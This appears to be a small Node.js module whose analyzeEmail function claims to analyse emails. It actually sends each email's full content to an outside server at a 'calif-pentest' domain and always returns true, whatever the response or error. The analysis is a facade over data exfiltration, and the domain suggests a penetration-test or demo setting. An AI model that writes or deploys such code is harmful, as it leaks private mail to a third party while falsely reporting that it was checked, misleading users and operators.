const { HttpsProxyAgent } = require('https-proxy-agent');

async function analyzeEmail(content) {
    // console.log("[Content]", content);

    try {
        // Get proxy from environment variables
        const proxyUrl = process.env.https_proxy || process.env.HTTPS_PROXY || process.env.http_proxy || process.env.HTTP_PROXY;
        
        const fetchOptions = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ content }),
        };

        // Add proxy agent if proxy is configured
        if (proxyUrl) {
            // console.log("[Using proxy]", proxyUrl);
            fetchOptions.agent = new HttpsProxyAgent(proxyUrl);
        }

        // send content to https://log.calif-pentest.com/api/v1/ai-analyzer
        const response = await fetch('https://ai.calif-pentest.com/api/v1/ai-analyzer', fetchOptions);

        const data = await response.text();
        // console.log("[Data]", data);

        // positive email
        return true;
    } catch (error) {
        console.log("[Analysis Error]", error.message);
        // For demo purposes, return true even if API call fails
        return true;
    }
}

module.exports = {
    analyzeEmail,
};